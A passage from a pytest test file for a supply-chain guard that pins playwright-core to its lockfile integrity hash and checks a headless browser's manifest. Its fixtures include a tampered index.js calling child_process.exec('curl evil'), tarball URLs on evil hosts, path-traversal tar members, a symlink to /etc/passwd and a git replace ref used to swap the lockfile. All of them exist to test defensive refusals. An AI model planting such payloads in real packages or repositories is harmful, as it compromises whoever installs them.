PW_FILES = {"package/package.json": b'{"name": "playwright-core", "version": "1.55.0"}',
            "package/index.js": b"module.exports = {};\n",
            "package/browsers.json": json.dumps({"browsers": [
                {"name": "chromium", "revision": "1190"},
                {"name": "chromium-headless-shell", "revision": "1243"}]}).encode()}


def sri(data):
    return "sha512-" + base64.b64encode(hashlib.sha512(data).digest()).decode()


def commit_lockfile(repo, entry, message="lockfile"):
    lock = {"name": "bricks", "lockfileVersion": 3, "packages": {"": {"name": "bricks"}}}
    if entry is not None:
        lock["packages"]["node_modules/playwright-core"] = entry
    (repo / "package-lock.json").write_text(json.dumps(lock))
    subprocess.run(["git", "-C", str(repo), "add", "package-lock.json"], check=True)
    subprocess.run(["git", "-C", str(repo), "commit", "-qm", message], check=True)
    return subprocess.run(["git", "-C", str(repo), "rev-parse", "HEAD"], capture_output=True, text=True).stdout.strip()


class Registry:
    """A fake fetch: the npm registry's metadata and tarball for playwright-core 1.55.0."""
    def __init__(self, tarball, integrity=None, url=None):
        self.tarball, self.calls = tarball, []
        self.meta = {"name": "playwright-core", "version": "1.55.0",
                     "dist": {"integrity": integrity or sri(tarball),
                              "tarball": url or "https://registry.npmjs.org/playwright-core/-/playwright-core-1.55.0.tgz"}}

    def __call__(self, url):
        self.calls.append(url)
        if url == "https://registry.npmjs.org/playwright-core/1.55.0":
            return json.dumps(self.meta).encode()
        if url == self.meta["dist"]["tarball"]:
            return self.tarball
        raise OSError("unexpected fetch of " + url)


def test_the_pin_comes_from_the_base_commits_lockfile_never_the_worktree(env):
    """Spec unit test 10."""
    tarball = npm_tarball(PW_FILES)
    base = commit_lockfile(env["repo"], {"version": "1.55.0", "integrity": sri(tarball)})
    (env["repo"] / "package-lock.json").write_text(json.dumps({"packages": {"node_modules/playwright-core": {
        "version": "1.99.0", "integrity": sri(b"the worker's choice")}}}))                  # the worktree's copy
    (env["repo"] / "node_modules" / "playwright-core").mkdir(parents=True)
    (env["repo"] / "node_modules" / "playwright-core" / "package.json").write_text('{"version": "1.99.0"}')
    assert lane.lock_entry(env["repo"], base) == ("1.55.0", sri(tarball))
    later = commit_lockfile(env["repo"], {"version": "1.99.0", "integrity": sri(b"later")}, "worker branch")
    assert lane.lock_entry(env["repo"], base) == ("1.55.0", sri(tarball))                    # the base, still
    assert lane.lock_entry(env["repo"], later)[0] == "1.99.0"


def test_a_lockfile_without_the_entry_or_a_plain_version_refuses_the_lane(env):
    """Spec unit test 10."""
    head = subprocess.run(["git", "-C", str(env["repo"]), "rev-parse", "HEAD"], capture_output=True, text=True).stdout.strip()
    with pytest.raises(lane.LaneRefused, match="has no package-lock.json"):
        lane.lock_entry(env["repo"], head)
    base = commit_lockfile(env["repo"], None)
    with pytest.raises(lane.LaneRefused, match="no node_modules/playwright-core entry"):
        lane.lock_entry(env["repo"], base)
    for version in ("1.55", "1.55.0-beta.1", "1.55.0\n", "../1.55.0", "١.55.0", 155, None):
        base = commit_lockfile(env["repo"], {"version": version, "integrity": sri(b"x")}, "v %r" % (version,))
        with pytest.raises(lane.LaneRefused, match="isn't x.y.z"):
            lane.lock_entry(env["repo"], base)
    base = commit_lockfile(env["repo"], {"version": "1.55.0", "integrity": "sha1-abc"}, "sha1")
    with pytest.raises(lane.LaneRefused, match="no sha512 integrity"):
        lane.lock_entry(env["repo"], base)


@pytest.mark.parametrize("case", ["registry claims the tampered bytes", "tarball bytes", "tarball host"])
def test_an_integrity_mismatch_refuses_the_lane_and_installs_nothing(env, unpack, case):
    """Spec unit test 10, with a fake fetch. The first case is a registry that serves tampered bytes and claims their
    hash: only the lockfile's committed hash may decide."""
    tarball = npm_tarball(PW_FILES)
    tampered = npm_tarball(dict(PW_FILES, **{"package/index.js": b"require('child_process').exec('curl evil')\n"}))
    base = commit_lockfile(env["repo"], {"version": "1.55.0", "integrity": sri(tarball)})
    fetch = {"registry claims the tampered bytes": Registry(tampered, integrity=sri(tampered)),
             "tarball bytes": Registry(tampered, integrity=sri(tarball)),
             "tarball host": Registry(tarball, url="https://evil.example/playwright-core-1.55.0.tgz")}[case]
    with pytest.raises(lane.LaneRefused, match="doesn't match the integrity hash in the base commit's lockfile|isn't on"):
        lane.pinned_playwright(env["repo"], base, fetch)
    assert not (lane.broker_root() / "playwright-core-1.55.0").exists()


def test_the_pinned_playwright_is_fetched_once_stamped_and_kept_outside_every_worktree(env, unpack, monkeypatch):
    tarball = npm_tarball(PW_FILES)
    base = commit_lockfile(env["repo"], {"version": "1.55.0", "integrity": sri(tarball)})
    fetch = Registry(tarball)
    seen = []
    real_rename = os.rename

    def rename(src, dst, *a, **k):
        seen.append(((Path(src) / lane.STAMP).read_text(), (Path(src) / lane.STAMP_MANIFEST).is_file()))
        return real_rename(src, dst, *a, **k)
    monkeypatch.setattr(lane.os, "rename", rename)
    dest = lane.pinned_playwright(env["repo"], base, fetch)
    monkeypatch.setattr(lane.os, "rename", real_rename)
    assert seen == [(sri(tarball) + "\n", True)]                           # the stamps are inside before the rename
    assert dest == teamlib.team_home() / "broker" / "playwright-core-1.55.0"
    assert (dest / "index.js").read_text() == "module.exports = {};\n" and lane.shell_revision(dest) == "1243"
    assert (dest / lane.STAMP).read_text() == sri(tarball) + "\n"            # inside: written before the rename
    assert sorted(p.name for p in dest.parent.iterdir() if p.name != ".install.lock") == ["playwright-core-1.55.0"]
    assert lane.pinned_playwright(env["repo"], base, fetch) == dest and len(fetch.calls) == 2   # no second fetch
    (dest / lane.STAMP).write_text(sri(b"other") + "\n")
    with pytest.raises(lane.LaneRefused, match="isn't stamped with the integrity hash"):
        lane.pinned_playwright(env["repo"], base, fetch)


def test_an_unstamped_folder_is_refused_with_how_to_recover(env):
    """Review: with the stamp written inside before the rename, a crash can't leave such a folder; one made by hand
    (or by an older teamd) is refused, and the message says to remove it."""
    tarball = npm_tarball(PW_FILES)
    base = commit_lockfile(env["repo"], {"version": "1.55.0", "integrity": sri(tarball)})
    (lane.broker_root() / "playwright-core-1.55.0").mkdir()
    with pytest.raises(lane.LaneRefused, match="remove it and the next lane fetches it again"):
        lane.pinned_playwright(env["repo"], base, Registry(tarball))


@pytest.mark.parametrize("name, data", [
    ("package/../../escaped.txt", b"x"), ("/tmp/absolute.txt", b"x"), ("other/index.js", b"x"),
    ("package/link", ("symlink", "/etc/passwd")), ("package/../package/ok.js", b"x"),
    ("package/hard", ("hardlink", "package/index.js")), ("package/dev", ("chr", "")),
])
def test_extraction_rejects_members_that_escape_the_package_folder(env, tmp_path, name, data):
    """Spec unit test 10."""
    dest = tmp_path / "unpacked" / "playwright-core-1.55.0"
    dest.parent.mkdir()
    with pytest.raises(lane.LaneRefused, match="outside its package folder"):
        lane.extract_package(npm_tarball(dict(PW_FILES, **{name: data})), dest, "sha512-x")
    assert not dest.exists() and not (tmp_path / "escaped.txt").exists()
    assert os.listdir(dest.parent) == []


def test_without_tarfiles_data_filter_nothing_is_unpacked(env, tmp_path, monkeypatch):
    monkeypatch.delattr(lane.tarfile, "data_filter", raising=False)
    dest = tmp_path / "playwright-core-1.55.0"
    with pytest.raises(lane.LaneRefused, match="no tarfile data filter"):
        lane.extract_package(npm_tarball(PW_FILES), dest, "sha512-x")
    assert not dest.exists()


@pytest.fixture
def manifests(tmp_path, monkeypatch):
    path = tmp_path / "browsers.json"
    path.write_text(json.dumps({"chromium-headless-shell": {}}))
    monkeypatch.setattr(lane, "MANIFESTS", path)
    return path


def record(manifests, revision, value):
    data = json.loads(manifests.read_text())
    data["chromium-headless-shell"].setdefault(revision, {})[lane.platform_key()] = value
    manifests.write_text(json.dumps(data))


def fake_shell(folder):
    (folder / "chrome-headless-shell-mac-arm64").mkdir(parents=True)
    (folder / "chrome-headless-shell-mac-arm64" / "chrome-headless-shell").write_bytes(b"\x7fELF shell")
    os.chmod(folder / "chrome-headless-shell-mac-arm64" / "chrome-headless-shell", 0o755)
    os.symlink("chrome-headless-shell-mac-arm64/chrome-headless-shell", folder / "current")
    (folder / "INSTALLATION_COMPLETE").write_text("")


def test_the_manifest_covers_paths_modes_links_and_contents(env, tmp_path):
    folder = tmp_path / "chromium_headless_shell-1243"
    fake_shell(folder)
    first = lane.manifest_hash(folder)
    assert lane.manifest_hash(folder) == first
    shell = folder / "chrome-headless-shell-mac-arm64" / "chrome-headless-shell"
    changes = [lambda: shell.write_bytes(b"\x7fELF other"), lambda: os.chmod(shell, 0o700),
               lambda: (os.unlink(folder / "current"), os.symlink("elsewhere", folder / "current")),
               lambda: (folder / "extra.dylib").write_bytes(b"")]
    for change in changes:
        before = lane.manifest_hash(folder)
        change()
        assert lane.manifest_hash(folder) != before
    os.chmod(shell, 0o775)                                              # writable by the group
    with pytest.raises(lane.LaneRefused, match="writable by someone other than its owner"):
        lane.manifest_hash(folder)


def test_the_manifest_refuses_links_out_of_the_folder_and_ignores_playwrights_marker(env, tmp_path):
    """Review: a symlink must be relative and stay inside; an empty DEPENDENCIES_VALIDATED (what Playwright writes when
    something launches the browser unsandboxed) carries no code and doesn't change the hash."""
    folder = tmp_path / "chromium_headless_shell-1243"
    fake_shell(folder)
    before = lane.manifest_hash(folder)
    (folder / "DEPENDENCIES_VALIDATED").write_text("")
    assert lane.manifest_hash(folder) == before
    (folder / "DEPENDENCIES_VALIDATED").write_text("not empty")
    assert lane.manifest_hash(folder) != before
    (folder / "DEPENDENCIES_VALIDATED").unlink()
    for target in ("/etc/passwd", "../../outside", "../chrome-headless-shell-mac-arm64/../../x"):
        link = folder / "chrome-headless-shell-mac-arm64" / "lib"
        if os.path.lexists(link):
            link.unlink()
        os.symlink(target, link)
        with pytest.raises(lane.LaneRefused, match="links outside the browser's folder"):
            lane.manifest_hash(folder)
    link.unlink()
    deep = folder / "x" / "y"
    deep.mkdir(parents=True)
    os.symlink("../..", deep / "top")                                  # x/y/top is the folder itself: inside
    os.symlink("top/../outside", deep / "out")                         # lexically x/y/outside; really ../outside
    with pytest.raises(lane.LaneRefused, match="links outside the browser's folder"):
        lane.manifest_hash(folder)
    shutil.rmtree(folder / "x")
    os.symlink("chrome-headless-shell", folder / "chrome-headless-shell-mac-arm64" / "lib")   # inside: fine
    assert lane.manifest_hash(folder) != before


def test_the_installer_runs_with_an_environment_built_from_nothing(env, manifests, monkeypatch):
    """Spec, the lane's browser: no download host, proxy or TLS variables; only chromium-headless-shell, without GC."""
    for name in ("HTTPS_PROXY", "PLAYWRIGHT_DOWNLOAD_HOST", "NODE_TLS_REJECT_UNAUTHORIZED", "NODE_EXTRA_CA_CERTS",
                 "NODE_OPTIONS", "PLAYWRIGHT_BROWSERS_PATH"):
        monkeypatch.setenv(name, "teamd's own")
    pw = env["tmp"] / "pw"
    pw.mkdir()
    (pw / "browsers.json").write_text(PW_FILES["package/browsers.json"].decode())
    runs = []

    def installer(cmd, env_, cwd, timeout=900):
        runs.append((cmd, env_))
        fake_shell(lane.browsers_root() / "chromium_headless_shell-1243")
        return Ran(0, "downloaded")
    monkeypatch.setattr(lane, "_run_env", installer)
    folder, revision = lane.install_headless_shell("/opt/homebrew/bin/node", pw)
    assert (folder, revision) == (teamlib.team_home() / "broker" / "browsers" / "chromium_headless_shell-1243", "1243")
    cmd, installer_env = runs[0]
    assert cmd == ["/opt/homebrew/bin/node", str(pw / "cli.js"), "install", "chromium-headless-shell"]
    assert installer_env == {"PATH": "/usr/bin:/bin", "HOME": str(env["home"]),
                             "PLAYWRIGHT_BROWSERS_PATH": str(lane.browsers_root()), "PLAYWRIGHT_SKIP_BROWSER_GC": "1"}
    assert lane.install_headless_shell("/opt/homebrew/bin/node", pw) == (folder, "1243") and len(runs) == 1
    assert stat_mode(os.lstat(lane.browsers_root())) == 0o700


def test_the_installer_runs_with_a_fixed_umask(env, tmp_path):
    """Review focus: a legitimate reinstall must not change the manifest because teamd's umask differs."""
    old = os.umask(0o077)
    try:
        r = lane._run_env(["/bin/sh", "-c", "umask"], {"PATH": "/usr/bin:/bin"}, cwd=tmp_path)
    finally:
        os.umask(old)
    assert r.returncode == 0 and r.stdout.strip() == "0022"


def test_a_failed_install_refuses_the_lane(env, manifests, monkeypatch):
    pw = env["tmp"] / "pw"
    pw.mkdir()
    (pw / "browsers.json").write_text(PW_FILES["package/browsers.json"].decode())
    monkeypatch.setattr(lane, "_run_env", lambda cmd, env_, cwd, timeout=900: Ran(1, "ERR npm_" + "a" * 36))
    with pytest.raises(lane.LaneRefused, match="installing chromium-headless-shell 1243 failed") as refused:
        lane.install_headless_shell("/opt/homebrew/bin/node", pw)
    assert "npm_aaaa" not in str(refused.value)                       # redacted
    (pw / "browsers.json").write_text(json.dumps({"browsers": [{"name": "chromium", "revision": "1190"}]}))
    with pytest.raises(lane.LaneRefused, match="names no chromium-headless-shell revision"):
        lane.install_headless_shell("/opt/homebrew/bin/node", pw)


def test_the_browsers_folder_and_everything_above_it_must_be_safe(env, manifests, tmp_path):
    """Review: checked as lane_node is. A folder above it that someone else can write refuses the lane (a sticky one,
    like /tmp, is fine: nobody else can rename what this user owns in it)."""
    folder = lane.browsers_root() / "chromium_headless_shell-1243"
    fake_shell(folder)
    record(manifests, "1243", lane.manifest_hash(folder))
    assert lane.check_manifest(folder, "1243")
    above = teamlib.team_home().parent
    os.chmod(above, 0o777)
    try:
        with pytest.raises(lane.LaneRefused, match="writable by someone other than its owner"):
            lane.check_manifest(folder, "1243")
        os.chmod(above, 0o1777)
        assert lane.check_manifest(folder, "1243")
    finally:
        os.chmod(above, 0o700)


def test_the_manifest_must_be_recorded_and_match(env, manifests):
    folder = lane.browsers_root() / "chromium_headless_shell-1243"
    fake_shell(folder)
    actual = lane.manifest_hash(folder)
    with pytest.raises(lane.LaneRefused) as unrecorded:
        lane.check_manifest(folder, "1243")
    message = str(unrecorded.value)
    assert "no manifest hash is recorded for chromium-headless-shell 1243 on " + lane.platform_key() in message
    assert "a person records the browser's manifest after `lane_acceptance.py --self-check-only` passes" in message
    assert actual not in message                                    # final fix wave: never the lead's to record
    assert actual in unrecorded.value.log and "team/superyak_team/lane/browsers.json" in unrecorded.value.log
    record(manifests, "1243", "0" * 64)
    with pytest.raises(lane.LaneRefused, match="doesn't match the manifest hash") as mismatch:
        lane.check_manifest(folder, "1243")
    assert actual not in str(mismatch.value) and "0" * 64 not in str(mismatch.value)
    assert actual in mismatch.value.log and "0" * 64 in mismatch.value.log
    record(manifests, "1243", actual)
    assert lane.check_manifest(folder, "1243") == actual


def test_the_checked_in_manifest_file_is_well_formed():
    data = json.loads((teamlib.package_dir() / "lane" / "browsers.json").read_text())
    assert isinstance(data["chromium-headless-shell"], dict)
    for revision, platforms in data["chromium-headless-shell"].items():
        assert revision.isdigit() and all(re.fullmatch(r"[0-9a-f]{64}", h) for h in platforms.values())


def test_lane_node_is_an_owned_absolute_binary_outside_home_and_worktrees(env, tmp_path):
    """Spec, the broker's node: never `which node`, never under a worktree, never writable by others."""
    for bad in (None, "", "node", "bin/node"):
        with pytest.raises(lane.LaneRefused, match="set lane_node"):
            lane.check_lane_node(bad, [])
    in_home = env["home"] / "bin" / "node"
    in_home.parent.mkdir()
    in_home.write_text("#!/bin/sh\n")
    in_home.chmod(0o755)
    with pytest.raises(lane.LaneRefused, match="under your home folder"):
        lane.check_lane_node(str(in_home), [])
    worktree = tmp_path / "repo-worktrees" / "t1" / "kaylee"
    (worktree / "node_modules" / ".bin").mkdir(parents=True)
    planted = worktree / "node_modules" / ".bin" / "node"
    planted.write_text("#!/bin/sh\n")
    planted.chmod(0o755)
    with pytest.raises(lane.LaneRefused, match="lies under the worktree"):
        lane.check_lane_node(str(planted), [str(worktree)])
    loose = tmp_path / "opt" / "node"
    loose.parent.mkdir()
    loose.write_text("#!/bin/sh\n")
    loose.chmod(0o777)
    with pytest.raises(lane.LaneRefused, match="writable by someone other than its owner"):
        lane.check_lane_node(str(loose), [])
    open_dir = tmp_path / "opt2"
    open_dir.mkdir()
    fine = open_dir / "node"
    fine.write_text("#!/bin/sh\n")
    fine.chmod(0o755)
    open_dir.chmod(0o777)                                               # the binary is fine; the folder above is not
    try:
        with pytest.raises(lane.LaneRefused, match="writable by someone other than its owner"):
            lane.check_lane_node(str(fine), [])
    finally:
        open_dir.chmod(0o700)
    system_node = "/usr/bin/node"
    if os.path.isfile(system_node):
        assert lane.check_lane_node(system_node, [str(worktree)]) == Path(os.path.realpath(system_node))


# ---------- Task 5, fix round 1 ----------

def test_a_symlinked_browser_folder_or_browsers_root_is_refused(env, manifests, tmp_path):
    """Review: _check_owner lets a symlink through, and a link hashes its target, whose ancestors nobody checked."""
    real = tmp_path / "elsewhere" / "chromium_headless_shell-1243"
    fake_shell(real)
    record(manifests, "1243", lane.manifest_hash(real))
    link = lane.browsers_root() / "chromium_headless_shell-1243"
    os.symlink(real, link)
    with pytest.raises(lane.LaneRefused, match="isn't a plain folder"):
        lane.check_manifest(link, "1243")
    link.unlink()
    shutil.rmtree(lane.browsers_root())
    os.symlink(real.parent, lane.broker_root() / "browsers")
    with pytest.raises(lane.LaneRefused, match="isn't a plain folder"):
        lane.check_manifest(real, "1243")


def test_the_browser_folder_must_be_directly_in_the_browsers_root(env, manifests, tmp_path):
    folder = tmp_path / "chromium_headless_shell-1243"          # a real folder, but not in browsers_root
    fake_shell(folder)
    record(manifests, "1243", lane.manifest_hash(folder))
    with pytest.raises(lane.LaneRefused, match="isn't directly in"):
        lane.check_manifest(folder, "1243")


class FakeOpener:
    def __init__(self, chunks=(), error=None, final="https://registry.npmjs.org/x"):
        self.chunks, self.error, self.final, self.timeouts = list(chunks), error, final, []

    def open(self, url, timeout=None):
        self.timeouts.append(timeout)
        if self.error:
            raise self.error
        return self

    def __enter__(self):
        return self

    def __exit__(self, *a):
        return False

    def read1(self, n=-1):
        return self.chunks.pop(0) if self.chunks else b""

    def geturl(self):
        return self.final


@pytest.mark.parametrize("error", [http.client.InvalidURL("bad"), http.client.IncompleteRead(b"ab", 5),
                                   http.client.BadStatusLine("x"), ValueError("odd"), TimeoutError("slow")])
def test_a_download_that_fails_any_way_is_a_refusal(monkeypatch, error):
    monkeypatch.setattr(lane.urllib.request, "build_opener", lambda *h: FakeOpener(error=error))
    with pytest.raises(lane.LaneRefused, match="can't be downloaded"):
        lane.https_get("https://registry.npmjs.org/x")


def test_a_download_must_be_https_all_the_way_and_finish_in_time(monkeypatch):
    with pytest.raises(lane.LaneRefused, match="isn't https"):
        lane.https_get("http://registry.npmjs.org/x")
    monkeypatch.setattr(lane.urllib.request, "build_opener", lambda *h: FakeOpener([b"ab"], final="http://evil/x"))
    with pytest.raises(lane.LaneRefused, match="isn't https"):
        lane.https_get("https://registry.npmjs.org/x")
    with pytest.raises(lane.LaneRefused, match="isn't https"):                          # a redirect to http
        lane._HttpsOnly().redirect_request(urllib.request.Request("https://a/"), None, 302, "Found", {}, "http://b/")
    monkeypatch.setattr(lane.urllib.request, "build_opener", lambda *h: FakeOpener([b"abcd", b"efgh"]))
    with pytest.raises(lane.LaneRefused, match="larger than"):
        lane.https_get("https://registry.npmjs.org/x", limit=5)
    monkeypatch.setattr(lane.urllib.request, "build_opener", lambda *h: FakeOpener([b"abcd", b"efgh"]))
    assert lane.https_get("https://registry.npmjs.org/x") == b"abcdefgh"


def test_the_tarball_url_is_built_here_and_the_registry_cant_name_another(env, unpack):
    tarball = npm_tarball(PW_FILES)
    base = commit_lockfile(env["repo"], {"version": "1.55.0", "integrity": sri(tarball)})
    fetch = Registry(tarball)
    lane.pinned_playwright(env["repo"], base, fetch)
    assert fetch.calls == ["https://registry.npmjs.org/playwright-core/1.55.0",
                           "https://registry.npmjs.org/playwright-core/-/playwright-core-1.55.0.tgz"]
    shutil.rmtree(lane.broker_root() / "playwright-core-1.55.0")
    other = Registry(tarball, url="https://registry.npmjs.org/playwright-core/-/../../evil/-/e.tgz")
    with pytest.raises(lane.LaneRefused, match="isn't on"):
        lane.pinned_playwright(env["repo"], base, other)
    assert other.calls == ["https://registry.npmjs.org/playwright-core/1.55.0"]


def test_a_bad_base_commit_or_a_lockfile_git_cant_decode_refuses_the_lane(env):
    for bad in ("HEAD", "abc", "--output=x", "g" * 40, "A" * 40, None):
        with pytest.raises(lane.LaneRefused, match="isn't a 40-character hex"):
            lane.lock_entry(env["repo"], bad)
    (env["repo"] / "package-lock.json").write_bytes(b'{"packages": {"\xff": 1}}')
    subprocess.run(["git", "-C", str(env["repo"]), "add", "package-lock.json"], check=True)
    subprocess.run(["git", "-C", str(env["repo"]), "commit", "-qm", "latin1"], check=True)
    head = subprocess.run(["git", "-C", str(env["repo"]), "rev-parse", "HEAD"], capture_output=True, text=True).stdout.strip()
    with pytest.raises(lane.LaneRefused, match="can't be read"):
        lane.lock_entry(env["repo"], head)


def test_a_replace_ref_cant_swap_the_base_commits_lockfile(env):
    good = {"version": "1.55.0", "integrity": sri(b"good")}
    base = commit_lockfile(env["repo"], good)
    blob = subprocess.run(["git", "-C", str(env["repo"]), "rev-parse", base + ":package-lock.json"],
                          capture_output=True, text=True).stdout.strip()
    evil = subprocess.run(["git", "-C", str(env["repo"]), "hash-object", "-w", "--stdin"], capture_output=True, text=True,
                          input=json.dumps({"packages": {"node_modules/playwright-core": {
                              "version": "9.9.9", "integrity": sri(b"evil")}}})).stdout.strip()
    subprocess.run(["git", "-C", str(env["repo"]), "replace", blob, evil], check=True)
    assert lane.lock_entry(env["repo"], base) == ("1.55.0", sri(b"good"))


def test_a_damaged_manifest_record_or_browsers_json_is_a_refusal_not_a_crash(env, manifests, tmp_path):
    for text in ("not json", "[]", '"x"', '{"chromium-headless-shell": []}', '{"chromium-headless-shell": {"1243": 5}}',
                 '\xff'):
        manifests.write_text(text)
        with pytest.raises(lane.LaneRefused, match="can't be read"):
            lane.recorded_manifest("1243")
    manifests.write_bytes(b"\xff\xfe")
    with pytest.raises(lane.LaneRefused, match="can't be read"):
        lane.recorded_manifest("1243")
    pw = tmp_path / "pw"
    pw.mkdir()
    for text in ("[]", "5", '{"browsers": 5}', '{"browsers": [5, null, {"name": 1}]}', "not json"):
        (pw / "browsers.json").write_text(text)
        with pytest.raises(lane.LaneRefused, match="names no chromium-headless-shell revision"):
            lane.shell_revision(pw)
    (pw / "browsers.json").write_bytes(b"\xff")
    with pytest.raises(lane.LaneRefused, match="names no chromium-headless-shell revision"):
        lane.shell_revision(pw)


def test_the_manifest_hashes_names_that_are_not_utf8(env, tmp_path):
    folder = tmp_path / "chromium_headless_shell-1243"
    fake_shell(folder)
    before = lane.manifest_hash(folder)
    fd = os.open(os.fsencode(folder) + b"/caf\xe9", os.O_CREAT | os.O_WRONLY, 0o644)
    os.close(fd)
    os.symlink(b"caf\xe9", os.fsencode(folder) + b"/lnk\xff")
    assert lane.manifest_hash(folder) != before


def test_the_manifest_refuses_a_folder_it_cant_read_and_a_link_given_as_the_folder(env, tmp_path):
    folder = tmp_path / "chromium_headless_shell-1243"
    fake_shell(folder)
    sealed = folder / "sealed"
    sealed.mkdir()
    sealed.chmod(0)
    try:
        if os.access(sealed, os.R_OK):
            pytest.skip("running as a user who can read anything")
        with pytest.raises(lane.LaneRefused, match="can't be read"):
            lane.manifest_hash(folder)
    finally:
        sealed.chmod(0o700)
    sealed.rmdir()
    link = tmp_path / "link"
    os.symlink(folder, link)
    with pytest.raises(lane.LaneRefused, match="isn't a plain folder"):
        lane.manifest_hash(link)


def test_every_property_the_manifest_covers_changes_or_refuses(env, tmp_path, monkeypatch):
    """Review: relative-only links, folder modes, hidden files, the marker at the top only, the top folder's own mode
    and owner."""
    folder = tmp_path / "chromium_headless_shell-1243"
    fake_shell(folder)
    inner = folder / "chrome-headless-shell-mac-arm64"
    shell = inner / "chrome-headless-shell"
    base = lane.manifest_hash(folder)
    os.symlink(str(shell), inner / "abs")                                # absolute, though it points inside
    with pytest.raises(lane.LaneRefused, match="links outside the browser's folder"):
        lane.manifest_hash(folder)
    (inner / "abs").unlink()
    os.chmod(inner, 0o700)                                               # a folder's mode
    assert lane.manifest_hash(folder) != base
    os.chmod(inner, 0o755)
    assert lane.manifest_hash(folder) == base
    (inner / ".hidden").write_bytes(b"")                                 # a hidden file
    assert lane.manifest_hash(folder) != base
    (inner / ".hidden").unlink()
    (inner / "DEPENDENCIES_VALIDATED").write_text("")                    # the marker only counts at the top
    assert lane.manifest_hash(folder) != base
    (inner / "DEPENDENCIES_VALIDATED").unlink()
    (folder / "DEPENDENCIES_VALIDATED").mkdir()                          # nor as a folder
    assert lane.manifest_hash(folder) != base
    (folder / "DEPENDENCIES_VALIDATED").rmdir()
    os.chmod(folder, 0o775)                                              # the top folder's own mode
    with pytest.raises(lane.LaneRefused, match="writable by someone other than its owner"):
        lane.manifest_hash(folder)
    os.chmod(folder, 0o755)
    if os.getuid() != 0:
        real_uid = os.getuid()
        monkeypatch.setattr(lane.os, "getuid", lambda: real_uid + 1)     # its owner
        with pytest.raises(lane.LaneRefused, match="belongs to another user"):
            lane.manifest_hash(folder)


def test_the_pinned_playwright_folder_is_checked_again_when_it_is_reused(env, unpack):
    tarball = npm_tarball(PW_FILES)
    base = commit_lockfile(env["repo"], {"version": "1.55.0", "integrity": sri(tarball)})
    dest = lane.pinned_playwright(env["repo"], base, Registry(tarball))
    assert stat_mode(os.lstat(dest)) == 0o755
    assert lane.pinned_playwright(env["repo"], base, Registry(tarball)) == dest
    (dest / "index.js").write_text("require('child_process').exec('curl evil')\n")      # changed after the install
    with pytest.raises(lane.LaneRefused, match="has changed since it was installed"):
        lane.pinned_playwright(env["repo"], base, Registry(tarball))
    (dest / "index.js").write_text("module.exports = {};\n")
    (dest / "extra.js").write_text("")
    with pytest.raises(lane.LaneRefused, match="has changed since it was installed"):
        lane.pinned_playwright(env["repo"], base, Registry(tarball))
    (dest / "extra.js").unlink()
    os.chmod(dest, 0o777)
    with pytest.raises(lane.LaneRefused, match="writable by someone other than its owner"):
        lane.pinned_playwright(env["repo"], base, Registry(tarball))
    os.chmod(dest, 0o755)
    above = dest.parent.parent                                          # broker_root() resets its own mode
    os.chmod(above, 0o777)
    try:
        with pytest.raises(lane.LaneRefused, match="writable by someone other than its owner"):
            lane.pinned_playwright(env["repo"], base, Registry(tarball))
    finally:
        os.chmod(above, 0o700)
    assert lane.pinned_playwright(env["repo"], base, Registry(tarball)) == dest


def test_unpack_leftovers_are_swept_before_a_new_unpack(env, unpack):
    tarball = npm_tarball(PW_FILES)
    base = commit_lockfile(env["repo"], {"version": "1.55.0", "integrity": sri(tarball)})
    old = lane.broker_root() / ".unpack-dead"
    (old / "package").mkdir(parents=True)
    (old / "package" / "x").write_text("x")
    os.symlink("/nonexistent", lane.broker_root() / ".unpack-link")
    lane.pinned_playwright(env["repo"], base, Registry(tarball))
    assert sorted(p.name for p in lane.broker_root().iterdir() if p.name != ".install.lock") == ["playwright-core-1.55.0"]


def holding(path):
    f = open(path, "a+")
    fcntl.flock(f, fcntl.LOCK_EX)
    return f


def blocked_until_released(call, path):
    """Run call() in a thread while another file holds the lock; it must wait, then finish once released."""
    f = holding(path)
    result = []
    t = threading.Thread(target=lambda: result.append(call()))
    t.start()
    t.join(0.5)
    waited = t.is_alive()
    fcntl.flock(f, fcntl.LOCK_UN)
    f.close()
    t.join(10)
    return waited, result


def test_the_install_lock_is_taken_by_the_installers_themselves_and_nests(env, unpack, monkeypatch):
    tarball = npm_tarball(PW_FILES)
    base = commit_lockfile(env["repo"], {"version": "1.55.0", "integrity": sri(tarball)})
    path = lane.broker_root() / ".install.lock"
    assert lane.install_lock_path() == path
    waited, result = blocked_until_released(lambda: lane.pinned_playwright(env["repo"], base, Registry(tarball)), path)
    assert waited and result == [lane.broker_root() / "playwright-core-1.55.0"]
    pw = env["tmp"] / "pw"
    pw.mkdir()
    (pw / "browsers.json").write_text(PW_FILES["package/browsers.json"].decode())
    monkeypatch.setattr(lane, "_run_env", lambda cmd, e, cwd, timeout=900: (
        fake_shell(lane.browsers_root() / "chromium_headless_shell-1243"), Ran(0, ""))[1])
    waited, result = blocked_until_released(lambda: lane.install_headless_shell("/opt/homebrew/bin/node", pw), path)
    assert waited and len(result) == 1
    def nested():
        with lane.install_lock():                                       # prepare_broker's own hold: no deadlock
            assert lane.pinned_playwright(env["repo"], base, Registry(tarball))
            assert lane.install_headless_shell("/opt/homebrew/bin/node", pw)
    t = threading.Thread(target=nested, daemon=True)
    t.start()
    t.join(10)
    assert not t.is_alive()


class Dripper(FakeOpener):
    """A server that sends one byte every 0.25 s. read(n) blocks until it has n bytes (capped here at 8 so a
    regression ends the test instead of hanging it); read1 returns what has arrived."""
    def read(self, n=-1):
        time.sleep(0.25 * min(n, 8))
        return b"x" * min(n, 8)

    def read1(self, n=-1):
        time.sleep(0.25)
        return b"x"


def test_the_download_deadline_holds_against_a_server_that_drips_bytes(monkeypatch):
    """Review: read(65536) blocks until it has 64 KiB, so a deadline checked between reads fires late."""
    fake = Dripper()
    monkeypatch.setattr(lane.urllib.request, "build_opener", lambda *h: fake)
    started = time.monotonic()
    with pytest.raises(lane.LaneRefused, match="took longer than"):
        lane.https_get("https://registry.npmjs.org/x", deadline=1)
    assert time.monotonic() - started < 1.75
    assert fake.timeouts and fake.timeouts[0] <= 1                    # connect and headers are bounded by it too
    assert FakeOpener().timeouts == []
    fake = FakeOpener([b"a"])
    monkeypatch.setattr(lane.urllib.request, "build_opener", lambda *h: fake)
    lane.https_get("https://registry.npmjs.org/x")
    assert fake.timeouts[0] <= 60


def test_https_get_installs_the_https_only_redirect_handler(monkeypatch):
    seen = []
    monkeypatch.setattr(lane.urllib.request, "build_opener", lambda *h: seen.extend(h) or FakeOpener([b"a"]))
    lane.https_get("https://registry.npmjs.org/x")
    assert lane._HttpsOnly in seen


def test_unpacking_under_a_group_writable_umask_still_gives_a_plain_package(env, unpack):
